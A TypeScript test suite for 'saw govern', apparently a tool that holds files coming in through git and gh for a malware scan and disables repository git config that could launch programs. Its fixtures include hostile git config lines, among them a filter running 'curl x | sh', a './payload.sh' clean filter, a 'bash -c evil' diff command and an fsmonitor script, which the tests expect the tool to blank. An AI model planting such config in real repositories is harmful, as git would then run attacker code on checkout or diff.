import { spawnSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import * as path from "node:path";

import { build } from "esbuild";
import { describe, expect, it } from "vitest";

import { enclosingFolder, ghBringsFiles, gitBringsFiles, parseGit, quietGit, repoConfigText, silencedRepoConfig } from "../../src/core/govern/command";
import { mayRelease, offersGovernRestore, offersGovernVerdict, openAdmission, prepareArgs, readApply, readGoverned, readNotice, readPrepare, readRestore, readVerdict, restoreArgs, sameCheck, shouldRestore, unheldAfter, verdictArgs, type GovernConfig } from "../../src/core/govern/contract";
import { activationEnv, governStatusDir, plan, posixWrapper, standinBeside, systemGovernBin, windowsWrapper } from "../../src/core/govern/plan";
import { report, target } from "./helpers";

const config = (overrides: Partial<GovernConfig> = {}): GovernConfig => ({
  enabled: true,
  saw: "/usr/local/bin/saw",
  realGit: "/usr/bin/git",
  realGh: "/usr/bin/gh",
  timeoutMs: 1000,
  folders: ["/work/app"],
  holdingRoot: "/tmp/holding",
  markerDir: "/tmp/markers",
  resultDir: "/tmp/results",
  progress: false,
  ...overrides,
});

function git(argv: string[], cwd = "/work/app") {
  const command = parseGit(argv, cwd);
  return { command, brings: command ? gitBringsFiles(command) : false };
}

describe("which git commands bring files in", () => {
  it("holds a pull, fetch, merge, rebase, checkout, switch, and submodule update", () => {
    for (const argv of [
      ["pull"],
      ["fetch", "origin"],
      ["merge", "main"],
      ["rebase", "origin/main"],
      ["checkout", "main"],
      ["switch", "main"],
      ["submodule", "update", "--init"],
      ["-C", "/work/app", "pull"],
    ]) {
      expect(git(argv).brings, argv.join(" ")).toBe(true);
    }
  });

  it("leaves status, commit, push, a path checkout, a new branch, and an abort alone", () => {
    for (const argv of [
      ["status"],
      ["diff"],
      ["log"],
      ["commit", "-m", "wip"],
      ["push"],
      ["checkout", "--", "README.md"],
      ["checkout", "-b", "feature"],
      ["switch", "-c", "feature"],
      ["merge", "--abort"],
      ["rebase", "--quit"],
      ["fetch", "--dry-run"],
      ["submodule", "status"],
    ]) {
      expect(git(argv).brings, argv.join(" ")).toBe(false);
    }
  });

  it("uses -C as the directory, including the attached form", () => {
    expect(parseGit(["-C", "/other", "pull"], "/work/app")?.directory).toBe(path.resolve("/other"));
    expect(parseGit(["-C/other", "status"], "/work/app")?.directory).toBe(path.resolve("/other"));
    expect(parseGit(["-c", "a.b=c", "pull"], "/work/app")?.subcommand).toBe("pull");
  });
});

describe("which gh commands land files", () => {
  it("holds a pull-request checkout, a sync, and a download", () => {
    expect(ghBringsFiles(["pr", "checkout", "12"])).toBe(true);
    expect(ghBringsFiles(["repo", "sync"])).toBe(true);
    expect(ghBringsFiles(["release", "download"])).toBe(true);
    expect(ghBringsFiles(["run", "download", "4"])).toBe(true);
  });

  it("leaves reading GitHub alone", () => {
    expect(ghBringsFiles(["pr", "view"])).toBe(false);
    expect(ghBringsFiles(["issue", "list"])).toBe(false);
    expect(ghBringsFiles(["repo", "clone", "acme/app"])).toBe(false);
  });
});

describe("the open folder a command targets", () => {
  it("is the innermost open folder that contains the directory", () => {
    expect(enclosingFolder(["/work", "/work/app"], "/work/app/src")).toBe(path.resolve("/work/app"));
    expect(enclosingFolder(["/work/app"], "/other")).toBeUndefined();
  });
});

describe("what the stand-in does", () => {
  it("runs the real git unless the command brings files into an open folder", () => {
    expect(plan(config(), "git", ["status"], "/work/app")).toEqual({ kind: "passthrough", program: "/usr/bin/git" });
    expect(plan(config(), "git", ["-C", "/other", "pull"], "/work/app")).toEqual({ kind: "passthrough", program: "/usr/bin/git" });
    expect(plan(config({ enabled: false }), "git", ["pull"], "/work/app")).toEqual({ kind: "passthrough", program: "/usr/bin/git" });
    const held = plan(config(), "git", ["pull", "origin", "main"], "/work/app/src");
    expect(held.kind).toBe("hold");
    if (held.kind === "hold") {
      expect(held.repo).toBe(path.resolve("/work/app"));
      expect(held.args).toEqual(["pull", "origin", "main"]);
    }
  });

  it("asks saw for progress events only when that saw reports them", () => {
    expect(prepareArgs("/work/app", "/tmp/holding/abc", "git", ["pull"], true)).toContain("--progress=jsonl");
    expect(prepareArgs("/work/app", "/tmp/holding/abc", "git", ["pull"])).not.toContain("--progress=jsonl");
  });

  it("asks saw to prepare that folder, and nothing else", () => {
    expect(prepareArgs("/work/app", "/tmp/holding/abc", "git", ["pull", "origin"])).toEqual([
      "govern", "prepare", "--json", "--repo", "/work/app", "--into", "/tmp/holding/abc", "--tool", "git", "--", "pull", "origin",
    ]);
  });

  it("places saw's stand-in when it sits beside saw, and activates it", () => {
    const saw = path.join("/usr/local/bin", "saw");
    const standin = path.join("/usr/local/bin", "saw-git-standin");
    const present = new Set([standin]);
    expect(standinBeside(saw, (file) => present.has(file))).toBe(standin);
    expect(standinBeside(saw, () => false)).toBeUndefined();
    expect(systemGovernBin("/xdg", "/home/me")).toBe(path.join("/xdg", "saw", "govern", "bin"));
    expect(systemGovernBin(undefined, "/home/me")).toBe(path.join("/home/me", ".config", "saw", "govern", "bin"));
    expect(governStatusDir("/state", "/home/me")).toBe(path.join("/state", "saw", "govern", "status"));
    expect(governStatusDir(undefined, "/home/me")).toBe(path.join("/home/me", ".local", "state", "saw", "govern", "status"));
    expect(governStatusDir("  ", "/home/me")).toBe(path.join("/home/me", ".local", "state", "saw", "govern", "status"));
    expect(activationEnv(config(), "git", "/tmp/holding/app")).toEqual({
      SAW_GOVERN_HOLDING: "/tmp/holding/app",
      SAW_REAL_GIT: "/usr/bin/git",
      SAW_REAL_GH: "/usr/bin/gh",
      SAW_BIN: "/usr/local/bin/saw",
      SAW_STANDIN_TOOL: "git",
    });
  });

  it("stops an open folder's git config from starting a program", () => {
    const quiet = quietGit(["-c", "core.fsmonitor=./mon.sh", "status"], "/empty/hooks", ["filter.evil.clean=", "filter.evil.required=false"]);
    expect(quiet.indexOf("-c")).toBeLessThan(quiet.indexOf("status"));
    expect(quiet).toContain("core.fsmonitor=false");
    expect(quiet).toContain("diff.external=");
    expect(quiet).toContain("core.hooksPath=/empty/hooks");
    expect(quiet).toContain("filter.evil.clean=");
    expect(quiet).not.toContain("core.fsmonitor=./mon.sh");
    expect(quiet.at(-1)).toBe("status");
    const text = [
      '[filter "lfs"]',
      "clean = git-lfs clean -- %f",
      "process = git-lfs filter-process",
      '[filter "evil"]',
      "clean = ./payload.sh",
      '[diff "ext"]',
      "command = bash -c evil",
    ].join("\n");
    expect(silencedRepoConfig(text)).toEqual([
      "filter.evil.clean=",
      "filter.evil.smudge=",
      "filter.evil.process=",
      "filter.evil.required=false",
      "diff.ext.command=",
      "diff.ext.textconv=",
    ]);
    const repo = path.resolve("/repo");
    const gitdir = path.resolve("/data/gitdir");
    const configFile = path.join(gitdir, "config");
    const files = new Map<string, string>([
      [path.join(repo, ".git"), `gitdir: ${gitdir}\n`],
      [configFile, '[include]\npath = extra\n[filter "evil"]\nclean = curl x | sh\n'],
      [path.resolve(path.dirname(configFile), "extra"), '[filter "also"]\nclean = ./x\n'],
    ]);
    const loaded = repoConfigText(repo, (file) => files.get(path.resolve(file)));
    expect(loaded).toContain("curl x | sh");
    expect(loaded).toContain("./x");
  });

  it("falls through to the real program when its configuration is gone", () => {
    const wrapper = posixWrapper("/usr/bin/node", "/ext/govern-shim.js", "/ext/config.json", "/usr/bin/git", "git");
    expect(wrapper).toContain("exec '/usr/bin/git' \"$@\"");
    expect(wrapper).toContain("--tool git");
  });

  it("runs the real program, and says so, when the stand-in's script is missing", () => {
    const wrapper = posixWrapper("/usr/bin/node", "/ext/govern-shim.js", "/ext/config.json", "/usr/bin/git", "git");
    const missing = wrapper.indexOf("if [ ! -f '/ext/govern-shim.js' ]; then");
    expect(missing).toBeGreaterThan(-1);
    expect(missing).toBeLessThan(wrapper.indexOf("export ELECTRON_RUN_AS_NODE=1"));
    const branch = wrapper.slice(missing, wrapper.indexOf("fi", missing));
    expect(branch).toContain("is missing, so this git runs without saw");
    expect(branch).toContain(">&2");
    expect(branch).toContain("exec '/usr/bin/git' \"$@\"");
  });

  it("runs the real program from a shell when the stand-in's script is missing", () => {
    if (process.platform === "win32") {
      return;
    }
    const dir = mkdtempSync(path.join(tmpdir(), "saw-wrapper-"));
    try {
      const wrapper = path.join(dir, "git");
      writeFileSync(wrapper, posixWrapper("/no/node", path.join(dir, "gone.js"), path.join(dir, "config.json"), "/bin/echo", "git"), { mode: 0o755 });
      const run = spawnSync(wrapper, ["still", "ran"], { encoding: "utf8" });
      expect(run.status).toBe(0);
      expect(run.stdout.trim()).toBe("still ran");
      expect(run.stderr).toContain("gone.js is missing");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("what the stand-in runs when it falls back", () => {
  it("refuses to write a wrapper whose fallback is a bare name, which PATH resolves to the wrapper", () => {
    expect(() => posixWrapper("/usr/bin/node", "/ext/govern-shim.js", "/ext/config.json", "git", "git")).toThrow(/full path/);
    expect(() => windowsWrapper("C:\\node.exe", "C:\\ext\\govern-shim.js", "C:\\ext\\config.json", "git", "git")).toThrow(/full path/);
    expect(() => windowsWrapper("C:\\node.exe", "C:\\ext\\govern-shim.js", "C:\\ext\\config.json", "C:\\Program Files\\Git\\cmd\\git.exe", "git")).not.toThrow();
  });

  it("quotes the missing script's path on Windows, so a ) in it does not end the block", () => {
    const shim = "C:\\Apps (portable)\\data\\extensions\\saw\\dist\\govern-shim.js";
    const wrapper = windowsWrapper("C:\\node.exe", shim, "C:\\cfg.json", "C:\\Git\\cmd\\git.exe", "git");
    const echo = wrapper.split("\r\n").find((line) => line.includes("echo saw:"));
    expect(echo).toBe(`  echo saw: "${shim}" is missing, so this git runs without saw's check. Reinstall the saw extension. 1>&2`);
  });
});

// The bundled stand-in, run the way a terminal runs it: a recorded bare git must not lead back to it.
describe.runIf(process.platform !== "win32")("the stand-in and a recorded bare git", () => {
  async function runGit(config: (dirs: { bin: string; real: string }) => Partial<GovernConfig>) {
    const root = mkdtempSync(path.join(tmpdir(), "saw-standin-"));
    const bin = path.join(root, "bin");
    const real = path.join(root, "real");
    mkdirSync(bin);
    mkdirSync(real);
    const shim = path.join(root, "govern-shim.js");
    await build({ entryPoints: [path.resolve(__dirname, "../../src/governShim.ts")], bundle: true, platform: "node", format: "cjs", outfile: shim, logLevel: "silent" });
    writeFileSync(path.join(real, "git"), '#!/bin/sh\necho "real git $*"\n', { mode: 0o755 });
    const configPath = path.join(root, "config.json");
    writeFileSync(configPath, JSON.stringify({ enabled: true, saw: "", realGh: "", timeoutMs: 1000, folders: [], holdingRoot: root, markerDir: root, resultDir: root, progress: false, ...config({ bin, real }) }));
    // Each entry to the wrapper is counted, and a fifth stops it, so a loop fails the test instead of the machine.
    const count = path.join(root, "count");
    const lines = posixWrapper(process.execPath, shim, configPath, path.join(real, "git"), "git").split("\n");
    lines.splice(1, 0, `n=$(( $(cat '${count}' 2>/dev/null || echo 0) + 1 )); echo $n > '${count}'`, 'if [ "$n" -ge 5 ]; then echo "LOOP" >&2; exit 99; fi');
    writeFileSync(path.join(bin, "git"), lines.join("\n"), { mode: 0o755 });
    const run = spawnSync("git", ["--version"], { cwd: root, encoding: "utf8", env: { ...process.env, PATH: [bin, real, process.env["PATH"]].join(path.delimiter) } });
    const entries = Number(readFileSync(count, "utf8").trim());
    rmSync(root, { recursive: true, force: true });
    return { run, entries };
  }

  it("runs the real git on PATH, and says so, when it knows its own folders", async () => {
    const { run, entries } = await runGit(({ bin }) => ({ realGit: "git", standinDirs: [bin] }));
    expect(entries).toBe(1);
    expect(run.stdout.trim()).toBe("real git --version");
    expect(run.stderr).toContain("is not a program saw's stand-in can run");
  }, 20_000);

  it("runs nothing, and says why, when an older configuration does not name its folders", async () => {
    const { run, entries } = await runGit(() => ({ realGit: "git" }));
    expect(entries).toBe(1);
    expect(run.status).toBe(127);
    expect(run.stdout).toBe("");
    expect(run.stderr).toContain("would run saw's stand-in again");
  }, 20_000);

  it("runs a recorded full path as before", async () => {
    const { run, entries } = await runGit(({ real }) => ({ realGit: path.join(real, "git") }));
    expect(entries).toBe(1);
    expect(run.stdout.trim()).toBe("real git --version");
    expect(run.stderr).toBe("");
  }, 20_000);
});

describe("saw govern's report", () => {
  it("releases a clean or residue scan and holds every other verdict", () => {
    expect(mayRelease("clean")).toBe(true);
    expect(mayRelease("residue")).toBe(true);
    expect(mayRelease("suspicious")).toBe(false);
    expect(mayRelease("infected")).toBe(false);
    expect(mayRelease("incomplete")).toBe(false);
    const clean = readPrepare(JSON.stringify({ schema_version: 1, scan: JSON.parse(report([target()])) }), 0);
    expect(clean).toMatchObject({ verdict: "clean", release: true });
    const infected = readPrepare(JSON.stringify({ schema_version: 1, scan: JSON.parse(report([target({ verdict: "infected" })])) }), 1);
    expect(infected.release).toBe(false);
    expect(infected.verdict).toBe("infected");
  });

  it("does not release a report it cannot read", () => {
    expect(readPrepare("not json", 0)).toMatchObject({ verdict: "incomplete", release: false });
    expect(readPrepare(JSON.stringify({ schema_version: 2, scan: {} }), 0).reasons.join(" ")).toMatch(/update the extension/);
    expect(readPrepare(JSON.stringify({ schema_version: 1, reason: "the update could not be prepared" }), 2)).toMatchObject({
      verdict: "incomplete",
      release: false,
    });
  });

  it("reads a checking notice, and ignores a file that is not one", () => {
    expect(readNotice(JSON.stringify({ repo: "/work/app", phase: "checking", step: "reading git history (2/6)", reasons: [], at: 1 }))).toMatchObject({
      phase: "checking",
      step: "reading git history (2/6)",
    });
    expect(readNotice(JSON.stringify({ repo: "/work/app", phase: "held", verdict: "infected", reasons: ["a workflow arrived"], at: 2 }))?.phase).toBe("held");
    expect(readNotice(JSON.stringify({ repo: "/work/app", phase: "finished", reasons: [], at: 3 }))?.phase).toBe("finished");
    expect(readNotice("not json")).toBeUndefined();
    expect(readNotice(JSON.stringify({ released: true }))).toBeUndefined();
  });

  it("reads whether saw let the tree in, and treats anything else as no answer", () => {
    expect(verdictArgs("/work/app")).toEqual(["govern", "verdict", "--json", "--repo", "/work/app"]);
    expect(readVerdict(JSON.stringify({ schema_version: 1, governed: "let-in", reason: "this tree is one saw let in" }))).toBe("let-in");
    expect(readVerdict(JSON.stringify({ schema_version: 1, governed: "not-let-in", reason: "this tree is not one saw let in" }))).toBe("not-let-in");
    expect(readVerdict(JSON.stringify({ schema_version: 1, governed: "could-not-answer", reason: "the open folder has no commit yet" }))).toBe("could-not-answer");
    expect(readVerdict(JSON.stringify({ schema_version: 1, governed: "clean" }))).toBe("could-not-answer");
    expect(readVerdict("not json")).toBe("could-not-answer");
    expect(readVerdict(JSON.stringify({ schema_version: 2, governed: "let-in" }))).toBe("could-not-answer");
  });

  it("keys off saw's machine code and the commits it names, not the prose", () => {
    const commit = "a".repeat(40);
    const other = "b".repeat(40);
    expect(readGoverned(JSON.stringify({
      schema_version: 1, governed: "not-let-in", code: "unknown-commit", reason: "this tree is not one saw let in", head: other, let_in: commit,
    }))).toEqual({ answer: "not-let-in", code: "unknown-commit", head: other, letIn: commit });
    expect(readGoverned(JSON.stringify({ schema_version: 1, governed: "not-let-in", code: "tree-changed", reason: "rewritten prose" })).code).toBe("tree-changed");
    expect(readGoverned(JSON.stringify({ schema_version: 1, governed: "let-in", reason: "this tree is one saw let in" })).code).toBeUndefined();
    expect(restoreArgs("/work/app")).toEqual(["govern", "restore", "--json", "--repo", "/work/app"]);
    expect(readRestore(JSON.stringify({ schema_version: 1, restored: true, commit })).restored).toBe(true);
    expect(readRestore(JSON.stringify({ schema_version: 1, restored: false, reason: "nothing to put back" }))).toMatchObject({ restored: false });
    expect(shouldRestore("unknown-commit", true)).toBe(true);
    expect(shouldRestore("tree-changed", true)).toBe(false);
    expect(shouldRestore("unknown-commit", false)).toBe(false);
    expect(shouldRestore(undefined, true)).toBe(false);
    expect(offersGovernRestore("  {prepare,apply,verdict,restore}\n")).toBe(true);
    expect(offersGovernRestore("  {prepare,apply,verdict}\n")).toBe(false);
  });

  it("decides an open folder from the verdict, and leaves no answer alone", () => {
    const unknown = { answer: "not-let-in" as const, code: "unknown-commit" as const };
    const changed = { answer: "not-let-in" as const, code: "tree-changed" as const };
    expect(openAdmission({ answer: "let-in" }, false)).toBe("clear");
    expect(openAdmission({ answer: "let-in", code: "let-in" }, true)).toBe("clear");
    expect(openAdmission(unknown, true)).toBe("restore");
    expect(openAdmission(unknown, false)).toBe("mark");
    expect(openAdmission(changed, true)).toBe("mark");
    expect(openAdmission({ answer: "not-let-in" }, true)).toBe("mark");
    expect(openAdmission({ answer: "could-not-answer" }, true)).toBe("leave");
    expect(openAdmission({ answer: "not-let-in", code: "could-not-answer" }, false)).toBe("leave");
    expect(openAdmission(undefined, true)).toBe("leave");
  });

  it("calls out a tree saw did not let in, and stays quiet when saw already let it in", () => {
    expect(unheldAfter("let-in", true)).toBe("clear");
    expect(unheldAfter("let-in", false)).toBe("clear");
    expect(unheldAfter("not-let-in", true)).toBe("mark");
    expect(unheldAfter("not-let-in", false)).toBe("mark");
    expect(unheldAfter("could-not-answer", true)).toBe("leave");
    expect(unheldAfter("could-not-answer", false)).toBe("leave");
    expect(unheldAfter(undefined, true)).toBe("leave");
    expect(unheldAfter(undefined, false)).toBe("mark");
  });

  it("recognises saw's verdict command from its help, and not an older govern", () => {
    expect(offersGovernVerdict("  {prepare,apply,verdict,install}\n")).toBe(true);
    expect(offersGovernVerdict("  verdict  say whether the open folder's tree is one saw let in\n")).toBe(true);
    expect(offersGovernVerdict("  {prepare,apply,install,status,uninstall}\n")).toBe(false);
  });

  it("shows one check once when saw and this window both write it", () => {
    expect(sameCheck(undefined, 5_000, 5_000)).toBe(false);
    expect(sameCheck(1_000, 1_050, 5_000)).toBe(true);
    expect(sameCheck(1_050, 1_000, 5_000)).toBe(true);
    expect(sameCheck(1_000, 7_000, 5_000)).toBe(false);
  });

  it("treats apply as done only when saw says the folder was updated", () => {
    expect(readApply(JSON.stringify({ schema_version: 1, applied: true }))).toEqual({ applied: true, reason: undefined });
    expect(readApply(JSON.stringify({ schema_version: 1, applied: false, reason: "left unchanged" })).applied).toBe(false);
    expect(readApply("").applied).toBe(false);
  });
});
